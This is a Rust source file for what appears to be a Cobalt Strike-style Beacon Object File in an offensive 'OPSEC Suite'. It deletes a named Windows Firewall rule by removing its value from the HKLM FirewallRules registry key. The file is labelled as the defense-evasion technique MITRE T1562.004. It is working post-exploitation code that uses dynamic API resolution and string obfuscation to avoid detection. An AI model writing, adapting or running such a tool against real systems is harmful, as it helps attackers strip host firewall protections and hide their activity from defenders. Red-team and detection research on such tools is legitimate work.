// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! Delete a Windows Firewall rule by name from registry.
//!
//! Enumerates values under:
//!   HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\
//!     FirewallPolicy\FirewallRules
//! and deletes any value whose name matches the given rule name.
//!
//! Args: <rulename>
//!
//! MITRE ATT&CK: T1562.004 (Disable or Modify System Firewall)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1562.004",
        name: "Disable or Modify System Firewall",
        tactic: "Defense Evasion",
    },
];

const HKEY_LOCAL_MACHINE: isize = 0x8000_0002u32 as i32 as isize;
const KEY_ALL_ACCESS: u32 = 0xF003F;
const ERROR_SUCCESS: u32 = 0;

dfr_fn!(
    reg_open_key_ex_a(
        hkey: isize, subkey: *const i8, options: u32,
        sam_desired: u32, result: *mut isize,
    ) -> u32,
    module = "advapi32.dll",
    api    = "RegOpenKeyExA"
);

dfr_fn!(
    reg_delete_value_a(hkey: isize, value_name: *const i8) -> u32,
    module = "advapi32.dll",
    api    = "RegDeleteValueA"
);

dfr_fn!(
    reg_close_key(hkey: isize) -> u32,
    module = "advapi32.dll",
    api    = "RegCloseKey"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let rulename = String::from(parser.get_str());
    if rulename.is_empty() {
        return Err("usage: del-firewall-rule <rulename>");
    }
    if rulename.len() > 128 { return Err("rulename too long"); }

    obf! { let key_path = "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules"; }
    let mut key_cstr = [0i8; 192];
    for (i, b) in key_path.bytes().enumerate() {
        if i + 1 < key_cstr.len() { key_cstr[i] = b as i8; }
    }

    let mut name_cstr = [0i8; 132];
    for (i, b) in rulename.bytes().enumerate() {
        if i + 1 < name_cstr.len() { name_cstr[i] = b as i8; }
    }

    let mut hkey: isize = 0;
    let rc = unsafe {
        reg_open_key_ex_a(HKEY_LOCAL_MACHINE, key_cstr.as_ptr(), 0, KEY_ALL_ACCESS, &mut hkey)
    }.map_err(|_| "resolve failed")?;

    if rc != ERROR_SUCCESS {
        return Err("registry key open failed");
    }

    let rc2 = unsafe {
        reg_delete_value_a(hkey, name_cstr.as_ptr())
    }.map_err(|_| "resolve failed")?;

    let _ = unsafe { reg_close_key(hkey) };

    if rc2 != ERROR_SUCCESS {
        return Err("rule not found or delete failed");
    }

    println!("[+] firewall rule deleted: {}", rulename);
    Ok(())
}
